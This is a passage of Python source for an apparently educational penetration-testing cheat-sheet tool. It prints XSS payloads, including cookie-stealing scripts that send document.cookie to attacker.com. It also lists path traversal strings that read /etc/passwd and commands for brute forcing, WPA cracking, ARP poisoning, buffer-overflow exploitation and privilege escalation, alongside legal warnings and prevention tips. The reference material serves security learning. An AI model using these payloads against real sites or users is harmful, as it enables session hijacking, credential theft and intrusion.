                    + "   Real scenario: Enterprise applications with deep packet inspection",
                ),
            ],
            "⚡ Event Handler Exploitation": [
                (
                    "<input onfocus=alert('XSS') autofocus>",
                    "Auto-triggering input field XSS\n"
                    + "   Use: When you can inject into form contexts\n"
                    + "   How: autofocus makes input focus immediately, triggering onfocus\n"
                    + "   Context: Form fields, user input areas",
                ),
                (
                    "<textarea onfocus=alert('XSS') autofocus>",
                    "Similar to input but uses textarea element\n"
                    + "   Use: When input tags are filtered but textarea isn't\n"
                    + "   How: Same autofocus principle with different element\n"
                    + "   Context: Comment boxes, message fields",
                ),
                (
                    "<video><source onerror=\"alert('XSS')\">",
                    "HTML5 video element error handling\n"
                    + "   Use: Modern browsers, when multimedia content is allowed\n"
                    + "   How: Video source fails to load, triggers onerror event\n"
                    + "   Context: Media-rich applications, social media sites",
                ),
                (
                    "<audio src=x onerror=alert('XSS')>",
                    "Audio element with error handling\n"
                    + "   Use: Alternative to video when audio tags are less filtered\n"
                    + "   How: Audio source 'x' fails, executes onerror JavaScript\n"
                    + "   Context: Music players, podcast sites, audio applications",
                ),
            ],
            "🍪 Cookie Stealing & Data Exfiltration": [
                (
                    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                    "Redirects user to attacker site with their cookies\n"
                    + "   Use: Session hijacking, account takeover\n"
                    + "   How: Changes page URL to attacker server, sends cookies as parameter\n"
                    + "   ⚠️ DANGER: Can steal user sessions and login credentials",
                ),
                (
                    "<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                    "Silently sends cookies to attacker via image request\n"
                    + "   Use: Covert data theft without user noticing\n"
                    + "   How: Creates invisible image request to attacker server\n"
                    + "   ⚠️ DANGER: Steals session data without redirecting user",
                ),
                (
                    "<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>",
                    "Modern API for sending data to attacker server\n"
                    + "   Use: Advanced data exfiltration in modern browsers\n"
                    + "   How: Uses fetch API to send cookies to attacker\n"
                    + "   ⚠️ DANGER: More reliable than image-based methods",
                ),
                (
                    "<script>navigator.sendBeacon('http://attacker.com/steal.php', document.cookie)</script>",
                    "Uses beacon API for reliable data transmission\n"
                    + "   Use: Ensures data reaches attacker even if user navigates away\n"
                    + "   How: Browser guarantees beacon delivery\n"
                    + "   ⚠️ DANGER: Most reliable method for data theft",
                ),
            ],
        }

        for category, payload_list in payloads_with_descriptions.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (payload, description) in enumerate(payload_list, 1):
                print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
                print(f"\033[93m   Description:\033[0m {description}")

        print(f"\n\033[91m⚠️  CRITICAL SAFETY & LEGAL WARNINGS:\033[0m")
        print("• NEVER use cookie-stealing payloads on sites you don't own")
        print("• Session hijacking is illegal without explicit permission")
        print("• Only test on your own applications or authorized penetration tests")
        print("• Use alert('XSS') for proof-of-concept, avoid data exfiltration")
        print("• Cookie theft can lead to identity theft and privacy violations")

        print(f"\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
        print("• Encode/escape all user input before displaying in HTML")
        print("• Use Content Security Policy (CSP) headers")
        print("• Validate input on both client and server side")
        print("• Use HTTPOnly flags on session cookies")
        print(
            "• Implement proper output encoding based on context (HTML, JavaScript, CSS)"
        )

        print(f"\n\033[96m📖 XSS TYPES EXPLAINED:\033[0m")
        print("• Reflected XSS: Payload in URL/form, reflected immediately")
        print("• Stored XSS: Payload saved in database, affects all users")
        print("• DOM XSS: Client-side JavaScript processes unsafe data")
        print("• Blind XSS: Payload executes in admin panels or internal systems")

    def _display_cheatsheet(self, tool_name: str, commands: Dict[str, List[tuple]]):
        """Display formatted cheatsheet"""
        print(f"\n\033[93m{f'{tool_name} CHEATSHEET'.center(80)}\033[0m")
        print(f"\033[93m{'='*80}\033[0m")

        for category, command_list in commands.items():
            print(f"\n\033[96m{category}:\033[0m")
            print("-" * len(category))

            for command, description in command_list:
                print(f"  \033[92m{command:<40}\033[0m {description}")

                # Option to add to favorites
                add_fav = self.get_user_input(
                    f"Add to favorites? (y/N): ", required=False
                )
                if add_fav and add_fav.lower() == "y":
                    self.favorites.add(f"{tool_name}: {command}")
                    self.print_success("Added to favorites")

    def _display_payload_list(self, title: str, payloads: Dict[str, List[str]]):
        """Display formatted payload list"""
        print(f"\n\033[93m{title.center(60)}\033[0m")
        print(f"\033[93m{'='*60}\033[0m")

        for category, payload_list in payloads.items():
            print(f"\n\033[96m{category}:\033[0m")
            print("-" * len(category))

            for i, payload in enumerate(payload_list, 1):
                print(f"  \033[94m{i:2d}.\033[0m \033[92m{payload}\033[0m")

    def _search_all_cheatsheets(self, keyword: str) -> List[Dict[str, str]]:
        """Search all cheatsheets for keyword"""
        results = []
        keyword_lower = keyword.lower()

        # Define comprehensive cheatsheet database
        all_cheatsheets = {
            "Nmap": {
                "Basic Scans": [
                    ("nmap -sS <target>", "SYN stealth scan"),
                    ("nmap -sT <target>", "TCP connect scan"),
                    ("nmap -sU <target>", "UDP scan"),
                    ("nmap -sA <target>", "ACK scan"),
                    ("nmap -sN <target>", "Null scan"),
                ],
                "Advanced": [
                    ("nmap -sS -A <target>", "Aggressive scan"),
                    ("nmap --script vuln <target>", "Vulnerability scripts"),
                    ("nmap -O <target>", "OS detection"),
                    ("nmap -sV <target>", "Service version detection"),
                ],
            },
            "SQLMap": {
                "Basic Usage": [
                    ("sqlmap -u <url>", "Basic SQL injection test"),
                    ("sqlmap -u <url> --dbs", "List databases"),
                    ("sqlmap -u <url> -D <db> --tables", "List tables"),
                    ("sqlmap -u <url> --dump", "Dump data"),
                ]
            },
            "Burp Suite": {
                "Proxy": [
                    ("Set proxy to 127.0.0.1:8080", "Configure browser proxy"),
                    ("Target > Add to scope", "Define scan scope"),
                    ("Proxy > Intercept > On/Off", "Toggle request interception"),
                ]
            },
            "Metasploit": {
                "Basic Commands": [
                    ("search <term>", "Search for exploits"),
                    ("use <exploit>", "Select exploit"),
                    ("set RHOSTS <target>", "Set target"),
                    ("exploit", "Run exploit"),
                ]
            },
            "Gobuster": {
                "Directory Bruteforce": [
                    ("gobuster dir -u <url> -w <wordlist>", "Directory brute force"),
                    (
                        "gobuster dns -d <domain> -w <wordlist>",
                        "DNS subdomain brute force",
                    ),
                    (
                        "gobuster vhost -u <url> -w <wordlist>",
                        "Virtual host brute force",
                    ),
                ]
            },
            "FFUF": {
                "Web Fuzzing": [
                    ("ffuf -w <wordlist> -u <url>/FUZZ", "Directory fuzzing"),
                    ("ffuf -w <wordlist> -u <url>?param=FUZZ", "Parameter fuzzing"),
                    (
                        'ffuf -w <wordlist> -H "Host: FUZZ.<domain>" -u <url>',
                        "Virtual host fuzzing",
                    ),
                ]
            },
        }

        # Search through all cheatsheets
        for tool_name, categories in all_cheatsheets.items():
            for category_name, commands in categories.items():
                for command, description in commands:
                    # Check if keyword matches in any field
                    if (
                        keyword_lower in command.lower()
                        or keyword_lower in description.lower()
                        or keyword_lower in tool_name.lower()
                        or keyword_lower in category_name.lower()
                    ):
                        results.append(
                            {
                                "tool": tool_name,
                                "category": category_name,
                                "command": command,
                                "description": description,
                            }
                        )

        # Also search custom commands
        for cmd_data in self.custom_commands.values():
            if (
                keyword_lower in cmd_data["command"].lower()
                or keyword_lower in cmd_data["description"].lower()
                or keyword_lower in cmd_data["category"].lower()
            ):
                results.append(
                    {
                        "tool": "Custom",
                        "category": cmd_data["category"],
                        "command": cmd_data["command"],
                        "description": cmd_data["description"],
                    }
                )

        return results

    def _add_custom_command(self):
        """Add custom command"""
        name = self.get_user_input("Enter command name: ")
        if not name:
            return

        command = self.get_user_input("Enter command: ")
        if not command:
            return

        description = self.get_user_input("Enter description: ")
        category = (
            self.get_user_input("Enter category (optional): ", required=False)
            or "Custom"
        )

        self.custom_commands[name] = {
            "command": command,
            "description": description,
            "category": category,
            "created": datetime.now().isoformat(),
        }

        self.print_success(f"Custom command '{name}' added")

    def _view_custom_commands(self):
        """View custom commands"""
        if not self.custom_commands:
            self.print_warning("No custom commands saved")
            return

        print(f"\n\033[93m{'CUSTOM COMMANDS'.center(60)}\033[0m")
        print(f"\033[93m{'-'*60}\033[0m")

        for name, cmd_info in self.custom_commands.items():
            print(f"\n\033[96m{name}\033[0m")
            print(f"  Command: \033[92m{cmd_info['command']}\033[0m")
            print(f"  Description: {cmd_info['description']}")
            print(f"  Category: {cmd_info['category']}")

    def _edit_custom_command(self):
        """Edit custom command"""
        if not self.custom_commands:
            self.print_warning("No custom commands to edit")
            return

        print("Available custom commands:")
        for i, name in enumerate(self.custom_commands.keys(), 1):
            print(f"\033[96m{i}.\033[0m {name}")

        choice = self.get_user_input("Select command to edit: ")
        if choice and choice.isdigit():
            cmd_names = list(self.custom_commands.keys())
            idx = int(choice) - 1
            if 0 <= idx < len(cmd_names):
                name = cmd_names[idx]
                print(f"Editing: {name}")

                new_command = self.get_user_input(
                    "Enter new command (or press Enter to keep current): ",
                    required=False,
                )
                new_description = self.get_user_input(
                    "Enter new description (or press Enter to keep current): ",
                    required=False,
                )

                if new_command:
                    self.custom_commands[name]["command"] = new_command
                if new_description:
                    self.custom_commands[name]["description"] = new_description

                self.print_success("Custom command updated")

    def _delete_custom_command(self):
        """Delete custom command"""
        if not self.custom_commands:
            self.print_warning("No custom commands to delete")
            return

        print("Available custom commands:")
        for i, name in enumerate(self.custom_commands.keys(), 1):
            print(f"\033[96m{i}.\033[0m {name}")

        choice = self.get_user_input("Select command to delete: ")
        if choice and choice.isdigit():
            cmd_names = list(self.custom_commands.keys())
            idx = int(choice) - 1
            if 0 <= idx < len(cmd_names):
                name = cmd_names[idx]
                confirm = self.get_user_input(f"Delete '{name}'? (y/N): ")
                if confirm.lower() == "y":
                    del self.custom_commands[name]
                    self.print_success("Custom command deleted")

    # Additional method stubs for other cheatsheets and references
    def _wireshark_cheatsheet(self):
        """Wireshark cheatsheet"""
        commands = {
            "Display Filters": [
                ("ip.addr == 192.168.1.1", "Filter by IP address"),
                ("tcp.port == 80", "Filter by TCP port"),
                ("http", "Show only HTTP traffic"),
                ("dns", "Show only DNS traffic"),
                ("tcp.flags.syn == 1", "Show SYN packets"),
                ("http.request.method == GET", "Show HTTP GET requests"),
            ],
            "Capture Filters": [
                ("host 192.168.1.1", "Capture from specific host"),
                ("port 80", "Capture on specific port"),
                ("tcp port 80", "Capture TCP traffic on port 80"),
                ("not broadcast and not multicast", "Exclude broadcast/multicast"),
                ("src host 192.168.1.1", "Capture from source host"),
            ],
        }
        self._display_cheatsheet("Wireshark", commands)

    def _nikto_cheatsheet(self):
        """Nikto cheatsheet"""
        commands = {
            "Basic Scans": [
                ("nikto -h <target>", "Basic scan"),
                ("nikto -h <target> -p 80,443", "Scan specific ports"),
                ("nikto -h <target> -ssl", "Force SSL"),
                ("nikto -h <target> -nossl", "Disable SSL"),
                ("nikto -h <target> -Format htm", "HTML output"),
            ]
        }
        self._display_cheatsheet("Nikto", commands)

    def _dirb_gobuster_cheatsheet(self):
        """Dirb/Gobuster cheatsheet"""
        commands = {
            "Dirb": [
                ("dirb <url>", "Basic directory scan"),
                ("dirb <url> <wordlist>", "Custom wordlist"),
                ("dirb <url> -X .php,.html", "Specific extensions"),
                ("dirb <url> -o output.txt", "Save output to file"),
            ],
            "Gobuster": [
                ("gobuster dir -u <url> -w <wordlist>", "Directory bruteforce"),
                ("gobuster dns -d <domain> -w <wordlist>", "DNS subdomain bruteforce"),
                ("gobuster vhost -u <url> -w <wordlist>", "Virtual host bruteforce"),
            ],
        }
        self._display_cheatsheet("Dirb/Gobuster", commands)

    def _hydra_cheatsheet(self):
        """Hydra cheatsheet"""
        commands = {
            "Basic Attacks": [
                ("hydra -l admin -p password <target> ssh", "SSH brute force"),
                ("hydra -L users.txt -P passwords.txt <target> ftp", "FTP brute force"),
                (
                    "hydra -l admin -P passwords.txt <target> http-post-form",
                    "HTTP form brute force",
                ),
            ]
        }
        self._display_cheatsheet("Hydra", commands)

    def _john_cheatsheet(self):
        """John the Ripper cheatsheet"""
        commands = {
            "Basic Usage": [
                ("john hashes.txt", "Crack password hashes"),
                ("john --wordlist=rockyou.txt hashes.txt", "Wordlist attack"),
                ("john --show hashes.txt", "Show cracked passwords"),
                ("john --format=md5 hashes.txt", "Specify hash format"),
            ]
        }
        self._display_cheatsheet("John the Ripper", commands)

    def _hashcat_cheatsheet(self):
        """Hashcat cheatsheet"""
        commands = {
            "Attack Modes": [
                (
                    "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
                    "Dictionary attack (MD5)",
                ),
                (
                    "hashcat -m 1000 -a 0 hashes.txt wordlist.txt",
                    "Dictionary attack (NTLM)",
                ),
                ("hashcat -m 0 -a 3 hashes.txt ?d?d?d?d", "Brute force attack"),
                ("hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d", "Hybrid attack"),
            ]
        }
        self._display_cheatsheet("Hashcat", commands)

    def _aircrack_cheatsheet(self):
        """Aircrack-ng cheatsheet"""
        commands = {
            "Wireless Commands": [
                ("airmon-ng start wlan0", "Enable monitor mode"),
                ("airodump-ng wlan0mon", "Scan for networks"),
                ("aireplay-ng -0 10 -a <BSSID> wlan0mon", "Deauth attack"),
                ("aircrack-ng -w wordlist.txt capture.cap", "Crack WPA/WPA2"),
            ]
        }
        self._display_cheatsheet("Aircrack-ng", commands)

    def _ettercap_cheatsheet(self):
        """Ettercap cheatsheet"""
        commands = {
            "Basic Usage": [
                (
                    "ettercap -T -M arp:remote /<target1>// /<target2>//",
                    "ARP poisoning",
                ),
                ("ettercap -T -M arp:remote /<gateway>// /<target>//", "MITM attack"),
                ("ettercap -T -q -i eth0", "Passive sniffing"),
            ]
        }
        self._display_cheatsheet("Ettercap", commands)

    def _tcpdump_cheatsheet(self):
        """tcpdump cheatsheet"""
        commands = {
            "Basic Capture": [
                ("tcpdump -i eth0", "Capture on interface"),
                ("tcpdump host 192.168.1.1", "Capture from specific host"),
                ("tcpdump port 80", "Capture on specific port"),
                ("tcpdump -w capture.pcap", "Write to file"),
                ("tcpdump -r capture.pcap", "Read from file"),
            ]
        }
        self._display_cheatsheet("tcpdump", commands)

    def _openssl_cheatsheet(self):
        """OpenSSL cheatsheet"""
        commands = {
            "Certificate Operations": [
                ("openssl x509 -in cert.pem -text -noout", "View certificate"),
                ("openssl s_client -connect host:443", "Test SSL connection"),
                (
                    "openssl req -new -keyout key.pem -out req.pem",
                    "Generate certificate request",
                ),
                ("openssl genrsa -out key.pem 2048", "Generate RSA private key"),
            ]
        }
        self._display_cheatsheet("OpenSSL", commands)

    def _curl_wget_cheatsheet(self):
        """curl/wget cheatsheet"""
        commands = {
            "curl": [
                ("curl -X GET <url>", "GET request"),
                ("curl -X POST -d 'data' <url>", "POST request"),
                ("curl -H 'Header: value' <url>", "Custom header"),
                ("curl -b 'cookie=value' <url>", "Send cookie"),
                ("curl -k <url>", "Ignore SSL errors"),
            ],
            "wget": [
                ("wget <url>", "Download file"),
                ("wget -r <url>", "Recursive download"),
                ("wget --user-agent='agent' <url>", "Custom user agent"),
                ("wget --no-check-certificate <url>", "Ignore SSL errors"),
            ],
        }
        self._display_cheatsheet("curl/wget", commands)

    def _owasp_top10_reference(self):
        """OWASP Top 10 reference"""
        top10 = [
            "1. Injection",
            "2. Broken Authentication",
            "3. Sensitive Data Exposure",
            "4. XML External Entities (XXE)",
            "5. Broken Access Control",
            "6. Security Misconfiguration",
            "7. Cross-Site Scripting (XSS)",
            "8. Insecure Deserialization",
            "9. Using Components with Known Vulnerabilities",
            "10. Insufficient Logging & Monitoring",
        ]

        print(f"\n\033[93m{'OWASP TOP 10 - 2017'.center(50)}\033[0m")
        print(f"\033[93m{'-'*50}\033[0m")
        for item in top10:
            print(f"\033[96m{item}\033[0m")

    def _sql_injection_reference(self):
        """SQL injection reference"""
        self.print_info(
            "SQL Injection techniques and payloads displayed above in payload generators"
        )

    def _xss_reference(self):
        """XSS reference"""
        self.print_info(
            "XSS techniques and payloads displayed above in payload generators"
        )

    def _csrf_reference(self):
        """CSRF (Cross-Site Request Forgery) reference"""
        csrf_info = {
            "Prevention": [
                ("Use CSRF tokens in forms", "Add unique tokens to each form"),
                ("Verify HTTP Referer header", "Check request origin"),
                ("Use SameSite cookie attribute", "Prevent cross-site cookie usage"),
                ("Implement double-submit cookies", "Additional CSRF protection"),
            ],
            "Testing": [
                ("Remove CSRF token from request", "Test if protection exists"),
                ("Change request method", "POST to GET conversion"),
                ("Use different Content-Type", "application/json to text/plain"),
                ("Cross-origin requests", "Test from different domain"),
            ],
        }
        self._display_cheatsheet("CSRF Protection & Testing", csrf_info)

    def _buffer_overflow_reference(self):
        """Buffer overflow reference with comprehensive use cases"""
        print(f"\n\033[96m📚 WHAT IS BUFFER OVERFLOW?\033[0m")
        print(
            "Buffer overflow occurs when a program writes more data to a memory buffer"
        )
        print("than it can hold, potentially overwriting adjacent memory and hijacking")
        print("program execution flow to run malicious code.")
        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
        print("• CTF competitions: Binary exploitation challenges")
        print("• Penetration testing: Exploiting custom software vulnerabilities")
        print("• Bug bounty hunting: Finding memory corruption in applications")
        print("• Red team exercises: Post-exploitation and privilege escalation")
        print(
            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only use on systems you own or have explicit permission to test!"
        )

        buffer_info = {
            "Stack-based Buffer Overflow": [
                (
                    "python -c \"print 'A'*100\"",
                    "Generate pattern to crash program\n"
                    + "   WHY: First step - see if program crashes with input\n"
                    + "   WHEN: Testing if buffer overflow exists\n"
                    + "   EXAMPLE: ./vulnerable_program $(python -c \"print 'A'*100\")\n"
                    + "   USE CASE: CTF binary challenges, testing custom software",
                ),
                (
                    "msf-pattern_create -l 200",
                    "Create unique pattern to find exact crash point\n"
                    + "   WHY: Each position has unique 4-byte sequence\n"
                    + "   WHEN: After confirming crash, need to find exact overflow point\n"
                    + "   EXAMPLE: Creates 'Aa0Aa1Aa2Aa3...' pattern\n"
                    + "   USE CASE: Determining exactly where return address is overwritten",
                ),
                (
                    "msf-pattern_offset -q 0x41414141",
                    "Find offset where return address gets overwritten\n"
                    + "   WHY: Tells you exactly how many bytes before return address\n"
                    + "   WHEN: After crash with unique pattern, use crashed EIP value\n"
                    + "   EXAMPLE: Returns 'offset: 112' meaning 112 bytes + return address\n"
                    + "   USE CASE: Building exploit payload with correct padding",
                ),
                (
                    "objdump -d binary | grep jmp",
                    "Find JMP instructions for exploit development\n"
                    + "   WHY: Need to redirect execution to your shellcode\n"
                    + "   WHEN: Building exploit, need JMP ESP or similar instruction\n"
                    + "   EXAMPLE: 0x08048abc <+123>: jmp *%esp\n"
                    + "   USE CASE: Stack-based exploits where you control ESP register",
                ),
            ],
            "Heap-based Buffer Overflow": [
                (
                    "ltrace ./program",
                    "Trace library calls to understand heap usage\n"
                    + "   WHY: Shows malloc(), free(), strcpy() calls that affect heap\n"
                    + "   WHEN: Analyzing how program manages dynamic memory\n"
                    + "   EXAMPLE: malloc(256) = 0x602010, strcpy(0x602010, user_input)\n"
                    + "   USE CASE: Finding heap corruption vulnerabilities in malloc/free",
                ),
                (
                    "valgrind ./program",
                    "Memory debugging to find heap corruption\n"
                    + "   WHY: Detects heap buffer overflows and use-after-free bugs\n"
                    + "   WHEN: Testing for memory corruption that crashes don't show\n"
                    + "   EXAMPLE: 'Invalid write of size 4 at 0x602014'\n"
                    + "   USE CASE: Finding subtle heap vulnerabilities in complex programs",
                ),
                (
                    "gdb -batch -ex run -ex bt --args ./program",
                    "Quick crash analysis with backtrace\n"
                    + "   WHY: Shows call stack when program crashes\n"
                    + "   WHEN: Understanding where heap corruption causes crash\n"
                    + "   EXAMPLE: Shows functions called before crash\n"
                    + "   USE CASE: Debugging heap exploitation attempts",
                ),
            ],
            "Protection Bypass Techniques": [
                (
                    "checksec --file=binary",
                    "Check binary security protections\n"
                    + "   WHY: Shows ASLR, NX, Stack Canaries, PIE status\n"
                    + "   WHEN: Planning exploit strategy based on enabled protections\n"
                    + "   EXAMPLE: 'NX enabled, Stack Canaries found, ASLR disabled'\n"
                    + "   USE CASE: Determining if you need ROP, ret2libc, or direct shellcode",
                ),
                (
                    "ROPgadget --binary binary",
                    "Find ROP gadgets for bypassing NX protection\n"
                    + "   WHY: NX prevents shellcode execution, need existing instructions\n"
                    + "   WHEN: Binary has NX enabled, need Return-Oriented Programming\n"
                    + "   EXAMPLE: 0x08048123: pop ebx; ret\n"
                    + "   USE CASE: Modern exploit development when direct shellcode blocked",
                ),
                (
                    "rabin2 -I binary",
                    "Binary information including security features\n"
                    + "   WHY: Shows architecture, endianness, security mitigations\n"
                    + "   WHEN: Initial reconnaissance before exploit development\n"
                    + "   EXAMPLE: arch x86, bits 32, canary false, nx true\n"
                    + "   USE CASE: Understanding target binary before writing exploit",
                ),
            ],
        }

        print(f"\n\033[96m🎯 TYPICAL WORKFLOW:\033[0m")
        print("1. Test with 'A' pattern → See if program crashes")
        print("2. Use unique pattern → Find exact crash point")
        print("3. Calculate offset → Know how many bytes needed")
        print("4. Check protections → Plan bypass strategy")
        print("5. Find gadgets/jumps → Build working exploit")

        self._display_cheatsheet("Buffer Overflow Exploitation", buffer_info)

    def _privilege_escalation_reference(self):
        """Privilege escalation reference with detailed use cases"""
        print(f"\n\033[96m📚 WHAT IS PRIVILEGE ESCALATION?\033[0m")
        print("Privilege escalation is the process of gaining higher access privileges")
        print(
            "than initially obtained, often moving from regular user to administrator/root."
        )
        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
        print("• CTF competitions: Escalating from www-data to root")
        print("• Red team exercises: Moving from initial access to domain admin")
        print("• Penetration testing: Demonstrating full system compromise")
        print("• Bug bounty hunting: Showing maximum impact of vulnerabilities")
        print(
            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only use on systems you own or have explicit permission to test!"
        )

        privesc_info = {
            "Linux Privilege Escalation": [
                (
                    "sudo -l",
                    "Check what commands you can run with sudo\n"
                    + "   WHY: Many privilege escalation paths through sudo misconfigurations\n"
                    + "   WHEN: After gaining initial access (SSH, web shell, etc.)\n"
                    + "   EXAMPLE: Shows '(root) NOPASSWD: /bin/vi' = can edit files as root\n"
                    + "   USE CASE: CTF challenges, pentesting when user has sudo access",
                ),
                (
                    "find / -perm -4000 2>/dev/null",
                    "Find SUID binaries that run with owner's privileges\n"
                    + "   WHY: SUID programs run as root even when called by regular users\n"
                    + "   WHEN: Looking for vulnerable programs that can be exploited\n"
                    + "   EXAMPLE: '/usr/bin/passwd' normally, but custom SUID binaries are dangerous\n"
                    + "   USE CASE: Finding vulnerable custom binaries, GTFObins exploitation",
                ),
                (
                    "ps aux | grep root",
                    "Check processes running as root\n"
                    + "   WHY: Root processes might have exploitable vulnerabilities\n"
                    + "   WHEN: Looking for running services to target\n"
                    + "   EXAMPLE: See MySQL running as root = potential privilege escalation vector\n"
                    + "   USE CASE: Identifying service exploitation opportunities",
                ),
                (
                    "crontab -l",
                    "Check scheduled tasks for current user\n"
                    + "   WHY: Cron jobs might run scripts you can modify\n"
                    + "   WHEN: Looking for writable scripts executed by higher privileges\n"
                    + "   EXAMPLE: Script runs every minute as root, but you can edit it\n"
                    + "   USE CASE: Modifying cron scripts to execute reverse shells",
                ),
                (
                    "cat /etc/passwd",
                    "List system users and their home directories\n"
                    + "   WHY: Shows user accounts and shell access\n"
                    + "   WHEN: Understanding user structure for lateral movement\n"
                    + "   EXAMPLE: 'admin:x:1000:1000:Admin User:/home/admin:/bin/bash'\n"
                    + "   USE CASE: Finding other user accounts to target",
                ),
                (
                    "uname -a",
                    "System information including kernel version\n"
                    + "   WHY: Kernel version reveals potential local exploits\n"
                    + "   WHEN: First step in privilege escalation enumeration\n"
                    + "   EXAMPLE: 'Linux 3.2.0-23-generic' = searchable for kernel exploits\n"
                    + "   USE CASE: Finding kernel exploits (DirtyCow, etc.)",
                ),
                (
                    "cat /proc/version",
                    "Detailed kernel and compiler information\n"
                    + "   WHY: More detailed than uname, shows compilation details\n"
                    + "   WHEN: Researching specific kernel exploit compatibility\n"
                    + "   EXAMPLE: Shows GCC version used to compile kernel\n"
                    + "   USE CASE: Matching kernel exploits to exact system configuration",
                ),
                (
                    "ls -la /home",
                    "Check home directories for accessible files\n"
                    + "   WHY: Users often store sensitive files in home directories\n"
                    + "   WHEN: Looking for SSH keys, passwords, or readable files\n"
                    + "   EXAMPLE: /home/user/.ssh/id_rsa or /home/user/.bash_history\n"
                    + "   USE CASE: Finding SSH keys for lateral movement",
                ),
            ],
            "Windows Privilege Escalation": [
                (
                    "whoami /priv",
                    "Check current user's privileges and tokens\n"
                    + "   WHY: Shows what privileges are enabled/disabled\n"
                    + "   WHEN: Understanding what you can do with current access\n"
                    + "   EXAMPLE: 'SeDebugPrivilege' = can debug other processes\n"
                    + "   USE CASE: Token impersonation, process injection attacks",
                ),
                (
                    "net user",
                    "List all users on the system\n"
                    + "   WHY: Shows user accounts for lateral movement targets\n"
                    + "   WHEN: Identifying high-value accounts (admin, service accounts)\n"
                    + "   EXAMPLE: Shows 'Administrator', 'Guest', and custom users\n"
                    + "   USE CASE: Password spraying, targeting specific accounts",
                ),
                (
                    "systeminfo",
                    "Detailed system information including patches\n"
                    + "   WHY: Shows Windows version and installed patches\n"
                    + "   WHEN: Looking for missing patches = potential exploits\n"
                    + "   EXAMPLE: 'Windows 10 Build 14393' with list of installed updates\n"
                    + "   USE CASE: Finding unpatched vulnerabilities (MS17-010, etc.)",
                ),
                (
                    "tasklist /svc",
                    "Show running services and their processes\n"
                    + "   WHY: Services often run with higher privileges\n"
                    + "   WHEN: Looking for vulnerable services to exploit\n"
                    + "   EXAMPLE: Custom service running as SYSTEM\n"
                    + "   USE CASE: Service exploitation, DLL hijacking",
                ),
                (
                    "wmic service list brief",
                    "Detailed service information including paths\n"
                    + "   WHY: Shows service executable paths and startup types\n"
                    + "   WHEN: Looking for unquoted service paths or writable directories\n"
                    + "   EXAMPLE: 'C:\\Program Files\\My Service\\service.exe' (unquoted)\n"
                    + "   USE CASE: Unquoted service path exploitation",
                ),
                (
                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                    "Check AlwaysInstallElevated policy\n"
                    + "   WHY: If enabled, MSI packages install with SYSTEM privileges\n"
                    + "   WHEN: Looking for privilege escalation through MSI installation\n"
                    + "   EXAMPLE: AlwaysInstallElevated = 1 means any MSI runs as SYSTEM\n"
                    + "   USE CASE: Creating malicious MSI for privilege escalation",
                ),
            ],
        }

        print(f"\n\033[96m🎯 TYPICAL LINUX PRIVESC WORKFLOW:\033[0m")
        print("1. Check sudo permissions → sudo -l")
        print("2. Find SUID binaries → find / -perm -4000")
        print("3. Check kernel version → uname -a (look for exploits)")
        print("4. Enumerate cron jobs → crontab -l")
        print("5. Check running processes → ps aux")

        print(f"\n\033[96m🎯 TYPICAL WINDOWS PRIVESC WORKFLOW:\033[0m")
        print("1. Check current privileges → whoami /priv")
        print("2. System information → systeminfo (missing patches)")
        print("3. Check services → tasklist /svc")
        print("4. Look for misconfigurations → AlwaysInstallElevated")
        print("5. Check unquoted service paths → wmic service list")

        self._display_cheatsheet("Privilege Escalation", privesc_info)

    def _path_traversal_reference(self):
        """Path traversal reference with comprehensive use cases"""
        print(f"\n\033[96m📚 WHAT IS PATH TRAVERSAL?\033[0m")
        print("Path traversal (directory traversal) allows attackers to access files")
        print(
            "outside the intended directory by manipulating file paths in web applications."
        )
        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
        print("• File download features: PDF generators, document viewers")
        print("• Image upload/display: Profile pictures, gallery applications")
        print("• Template engines: Theme selectors, page builders")
        print("• File managers: Web-based file browsers, cloud storage")
        print("• Include mechanisms: PHP includes, server-side includes")
        print(
            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only test on applications you own or have permission to test!"
        )

        path_info = {
            "Basic Path Traversal": [
                (
                    "../../../etc/passwd",
                    "Linux password file access using relative paths\n"
                    + "   WHY: /etc/passwd contains user account information\n"
                    + "   WHEN: Testing file download or include functionality\n"
                    + "   EXAMPLE: download.php?file=../../../etc/passwd\n"
                    + "   USE CASE: Web apps with file download features, document viewers",
                ),
                (
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "Windows hosts file access using backslashes\n"
                    + "   WHY: hosts file shows DNS mappings and system configuration\n"
                    + "   WHEN: Testing Windows-based web applications\n"
                    + "   EXAMPLE: view.php?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n"
                    + "   USE CASE: IIS servers, ASP.NET applications",
                ),
                (
                    "....//....//....//etc/passwd",
                    "Double encoding to bypass basic filters\n"
                    + "   WHY: Some filters only remove one set of ../ patterns\n"
                    + "   WHEN: Basic path traversal filters are in place\n"
                    + "   EXAMPLE: ....// becomes ../ after filtering\n"
                    + "   USE CASE: Applications with simple string replacement filters",
                ),
                (
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "URL encoding to bypass character filtering\n"
                    + "   WHY: %2F is URL-encoded forward slash (/)\n"
                    + "   WHEN: Forward slashes are filtered but URL decoding happens\n"
                    + "   EXAMPLE: Web server decodes %2F to / after filtering\n"
                    + "   USE CASE: WAFs and input filters that miss encoded characters",
                ),
                (
                    "..%252F..%252F..%252Fetc%252Fpasswd",
                    "Double URL encoding for advanced filter bypass\n"
                    + "   WHY: %252F becomes %2F after first decode, then / after second\n"
                    + "   WHEN: Multiple layers of URL decoding occur\n"
                    + "   EXAMPLE: Double-encoded slash bypasses URL decode filters\n"
                    + "   USE CASE: Complex web applications with multiple decode stages",
                ),
